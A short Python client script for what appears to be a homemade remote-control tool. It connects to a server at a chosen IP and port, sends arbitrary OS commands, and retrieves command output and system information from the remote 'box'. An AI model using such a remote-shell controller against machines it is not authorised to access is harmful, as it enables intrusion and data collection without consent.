import socket

client_soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = '....enter the ip address which binds the server file....'
port = 8899
client_soc.connect((ip, port))
print('-----This was developed with only four commands you can upgrade this with your own ideas-----')
print('1.OS'
      '2.play'
      '3.send-me-os-info'
      '4.chat-with-box')
while True:
    recv = client_soc.recv(1024).decode()
    print(recv)
    msg = input('-> ')
    client_soc.send(msg.encode())
    if msg == "OS":
        command = input('<-> ')
        client_soc.send(command.encode())
        output = client_soc.recv(1024012).decode()
        print(output)
    elif msg == 'play':
        recved = client_soc.recv(10245).decode()
        print(recved)
    elif msg == 'send-me-os-info':
        outputs = client_soc.recv(5000000).decode()
        print(outputs)
    elif msg == 'chat-with-box':
        msges = input('(:-:)-> ')
        client_soc.send(msges.encode())
        outpt = client_soc.recv(4096).decode()
        print(outpt)
